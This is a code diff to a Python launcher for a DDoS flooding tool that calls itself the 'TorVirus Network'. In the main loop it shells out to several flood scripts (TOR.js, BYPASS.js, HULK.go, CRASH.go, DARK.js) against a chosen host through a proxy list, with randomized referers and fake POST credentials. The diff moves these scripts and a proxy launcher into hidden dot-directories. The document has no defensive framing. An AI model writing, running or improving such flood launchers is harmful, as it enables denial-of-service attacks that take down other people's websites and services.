@@ -1,8 +1,4 @@
-import os
-import time
-import sys
-import random
-
+import os, time, sys, random
 def progress(curr, total, bl=30):
     filled = int(bl * curr // total)
     bar = '█' * filled + '-' * (bl - filled)
@@ -118,12 +114,12 @@ def main_loop():
                 anim_text(f"Engaging Attack on {host} for {total_time} seconds... 💥", 0.05)
 
                 while time.time() - start_time < total_time:
-                    os.system(f'node TOR.js GET "{host}" {attack_time} 50 90 proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full')
-                    os.system(f'node TOR.js POST "{host}" {attack_time} 50 90 proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full')
-                    os.system(f'node BYPASS.js {host} {attack_time} 32 50 proxy.txt')
-                    os.system(f'go run HULK.go --site {host} --data GET')
-                    os.system(f'go run CRASH.go {host} 9999 get {attack_time} nil')
-                    os.system(f'node DARK.js GET {host} {attack_time} 32 50 proxy.txt')
+                    os.system(f'node .TorCache/.TorOdd/TOR.js GET "{host}" {attack_time} 50 90 proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full')
+                    os.system(f'node .TorCache/.TorOdd/TOR.js POST "{host}" {attack_time} 50 90 proxy.txt --query 1 --cookie "uh=good" --delay 1 --bfm true --referer rand --postdata "user=f&pass=%RAND%" --debug --randrate --full')
+                    os.system(f'node .TorCache/.TorOdd/BYPASS.js {host} {attack_time} 32 50 proxy.txt')
+                    os.system(f'go run .TorCache/.TorOdd/HULK.go --site {host} --data GET')
+                    os.system(f'go run .TorCache/.TorOdd/CRASH.go {host} 9999 get {attack_time} nil')
+                    os.system(f'node .TorCache/.TorOdd/DARK.js GET {host} {attack_time} 32 50 proxy.txt')
 
                     time.sleep(1)
 
@@ -142,7 +138,7 @@ CLEAR - Clear Terminal
 
 def connect():
     anim_text("🔌 Connecting to the TorVirus Network...", 0.02)
-    os.system('python3 proxy.py &')
+    os.system('python3 .TorCache/.TorOdd/proxy.py &')
     rand_cool_text()
 
 session_start = time.time()
